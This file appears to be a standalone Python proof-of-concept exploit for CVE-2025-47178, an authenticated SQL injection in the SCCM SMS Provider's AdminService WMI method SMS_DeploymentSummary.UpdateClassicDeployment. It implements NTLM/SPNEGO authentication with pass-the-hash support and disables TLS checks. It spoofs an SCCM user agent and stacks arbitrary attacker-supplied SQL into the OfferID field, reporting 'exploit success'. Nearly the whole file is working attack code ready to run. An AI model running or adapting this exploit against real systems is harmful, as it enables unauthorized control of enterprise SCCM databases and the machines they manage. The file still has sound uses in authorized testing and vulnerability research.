import logging
import argparse
import base64
from json import dumps
from requests.auth import AuthBase
from requests import Session, Request
from urllib3 import disable_warnings, exceptions
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ntlm import getNTLMSSPType1, getNTLMSSPType3
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech

disable_warnings(exceptions.InsecureRequestWarning)


class HttpNtlmAuth(AuthBase):
    def __init__(self, username, password, domain, lmhash="", nthash="", workstation=""):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.workstation = workstation

    def __call__(self, r):
        r.headers["Connection"] = "Keep-Alive"
        r.register_hook("response", self.response_hook)
        return r

    @staticmethod
    def get_ntlm1(domain, workstation=""):
        ntlm_type1 = getNTLMSSPType1(workstation, domain)
        spnegoNegTokenInit = SPNEGO_NegTokenInit()
        spnegoNegTokenInit["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        spnegoNegTokenInit["MechToken"] = ntlm_type1.getData()
        return spnegoNegTokenInit.getData(), ntlm_type1

    @staticmethod
    def get_ntlm3(ntlm_t2_blob, ntlm_t1, user, password, domain, lmhash, nthash):
        spnegoTokenResp = SPNEGO_NegTokenResp(ntlm_t2_blob)
        ntlm_type2 = spnegoTokenResp["ResponseToken"]
        ntlm_type3, exportedSessionKey = getNTLMSSPType3(ntlm_t1, ntlm_type2, user, password, domain, lmhash, nthash)
        spnegoNegTokenResp = SPNEGO_NegTokenResp()
        spnegoNegTokenResp["ResponseToken"] = ntlm_type3.getData()
        return spnegoNegTokenResp.getData()

    def response_hook(self, r, **kwargs):
        if r.status_code == 401:
            www_authenticate = r.headers.get("www-authenticate", "").lower()
            auth_type = self._auth_type_from_header(www_authenticate)

            if auth_type is not None:
                return self.retry_using_http_NTLM_auth(
                    "www-authenticate",
                    "Authorization",
                    r,
                    auth_type,
                    kwargs,
                )

        return r

    def retry_using_http_NTLM_auth(
        self,
        auth_header_field,
        auth_header,
        response,
        auth_type,
        args,
    ):
        """Attempt to authenticate using HTTP NTLM challenge/response."""
        if auth_header in response.request.headers:
            return response

        content_length = int(response.request.headers.get("Content-Length", "0"), base=10)
        if hasattr(response.request.body, "seek"):
            if content_length > 0:
                response.request.body.seek(-content_length, 1)
            else:
                response.request.body.seek(0, 0)

        response.content
        response.raw.release_conn()
        request = response.request.copy()

        spnego_negtoken, ntlm_type1 = self.get_ntlm1(self.domain, self.workstation)
        auth = "%s %s" % (auth_type, base64.b64encode(spnego_negtoken).decode())

        request.headers[auth_header] = auth

        args_nostream = dict(args, stream=False)
        response2 = response.connection.send(request, **args_nostream)

        response2.content
        response2.raw.release_conn()
        request = response2.request.copy()

        if response2.headers.get("set-cookie"):
            request.headers["Cookie"] = response2.headers.get("set-cookie")

        auth_header_value = response2.headers[auth_header_field]

        auth_strip = auth_type + " "

        ntlm_header_value = next(
            (s.strip() for s in (val.lstrip() for val in auth_header_value.split(",")) if s.startswith(auth_strip)),
            None,
        )

        if not ntlm_header_value:
            raise PermissionError("Access denied: Server did not respond with NTLM challenge token")

        spnego_resp = base64.b64decode(ntlm_header_value[len(auth_strip) :].encode())
        authenticate_message = base64.b64encode(
            self.get_ntlm3(spnego_resp, ntlm_type1, self.username, self.password, self.domain, self.lmhash, self.nthash)
        ).decode()

        auth = "%s %s" % (auth_type, authenticate_message)
        request.headers[auth_header] = auth

        response3 = response2.connection.send(request, **args)
        response3.history.append(response)
        response3.history.append(response2)

        return response3

    @staticmethod
    def _auth_type_from_header(header):
        if "negotiate" in header:
            return "Negotiate"
        elif "ntlm" in header:
            return "NTLM"
        return None


class SCCMAdmin:
    def __init__(self, target, username, password, domain, options, proxies=None, ua="SMS_MP_CONTROL_MANAGER"):
        self.target_url = "https://%s/AdminService/wmi/" % target.rstrip("/")
        self.ua = ua
        self.proxies = proxies

        self.s = Session()
        self.s.verify = False
        self.s.proxies = self.proxies
        self.s.headers["User-Agent"] = self.ua
        self.s.headers["Content-Type"] = "application/json; odata=verbose"

        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(":")

        self.s.auth = HttpNtlmAuth(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def _post_preq(self, path, json_body):
        return Request("POST", self.target_url + path, json=json_body)

    def _get_preq(self, path):
        return Request("GET", self.target_url + path)

    def __call_wmi_method(self, method, args):
        preq = self.s.prepare_request(self._post_preq(method, args))
        logging.info(f'WMI method: {method}')
        logging.info(f'WMI arguments : {args}')
        r = self.s.send(preq)
        if r.status_code == 401:
            logging.error("Unauthorized access, please check your credentials")
            return r
        else:
            return r


    def do_sqli_SMS_DeploymentSummary(self, sql):
        args = {"OfferID": f"1' or 1=1; {sql}; select '1"}
        r = self.__call_wmi_method('SMS_DeploymentSummary.UpdateClassicDeployment', args)
        if r.status_code == 500 and 'does not have permission to update the deployment results' in r.text:
            logging.info(f'Got expected server error, exploit success !')
            print(dumps(r.json(),indent=4))
        else:
            logging.error('Exploit failed')
            print(r.text)




if __name__ == "__main__":
    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="SCCM SMS PROVIDER (WMI SMS_DeploymentSummary.UpdateClassicDeployment) Authenticated SQL injection - CVE-2025-47178")

    parser.add_argument("target", action="store", help="[domain/][username[:password]@]<address>")

    parser.add_argument("-st", help="CCache with service ticket. (or prepend env var KRB5CCNAME)")
    parser.add_argument("-debug", action="store_true", default=False, help="Debug")
    parser.add_argument("-silent", action="store_true", default=False, help="Silent")
    parser.add_argument("-ts", action="store_true", default=False, help="Toggle timestamp in logs")
    parser.add_argument("-a", action="store", required=False, default=None, help="Action")
    parser.add_argument("-c", action="store", required=False, default=None, help="WMI Class")
    parser.add_argument("-sql", action="store", required=False, default='select 1', help="SQL Query")

    group = parser.add_argument_group("authentication")

    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH", help="NTLM hashes, format is LMHASH:NTHASH")

    options = parser.parse_args()

    logger.init(ts=options.ts)
    logging.getLogger().setLevel(logging.INFO)

    proxies = None
    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ""

    if password == "" and username != "" and options.hashes is None :
        from getpass import getpass

        password = getpass("Password:")

    sccm_admin = SCCMAdmin(address, username, password, domain, options)

    sccm_admin.do_sqli_SMS_DeploymentSummary(options.sql)

